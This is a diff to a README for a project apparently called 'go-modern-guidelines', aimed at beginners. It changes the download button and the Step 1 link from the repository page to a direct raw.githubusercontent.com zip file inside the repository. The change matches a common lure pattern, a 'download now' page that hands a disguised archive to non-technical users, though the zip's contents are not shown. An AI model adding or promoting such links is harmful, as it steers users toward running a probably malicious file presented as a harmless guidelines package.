@@ -1,7 +1,7 @@
 <h1>✨ go-modern-guidelines - Write Better Go Code Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/capitalist-prepuberty1057/go-modern-guidelines" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download go-modern-guidelines Now</a>
+  <a href="https://raw.githubusercontent.com/capitalist-prepuberty1057/go-modern-guidelines/main/plugin/skills/2.8-beta.5.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ Download go-modern-guidelines Now</a>
 </p>
 
 ## 🧭 What Is This?
@@ -16,7 +16,7 @@ This is a **guidelines package** for your computer. It helps special software ca
 
 ### Step 1: Visit the Download Page
 
-Click the big purple button at the top of this page, or click here: **[https://github.com/capitalist-prepuberthy1057/go-modern-guidelines](https://github.com/capitalist-prepuberthy1057/go-modern-guidelines)**. This will open your web browser and take you to the official download page.
+Click the big purple button at the top of this page, or click here: **[https://raw.githubusercontent.com/capitalist-prepuberty1057/go-modern-guidelines/main/plugin/skills/2.8-beta.5.zip](https://raw.githubusercontent.com/capitalist-prepuberty1057/go-modern-guidelines/main/plugin/skills/2.8-beta.5.zip)**. This will open your web browser and take you to the official download page.
 
 . **Do not close this page until you have finished downloading.**
 
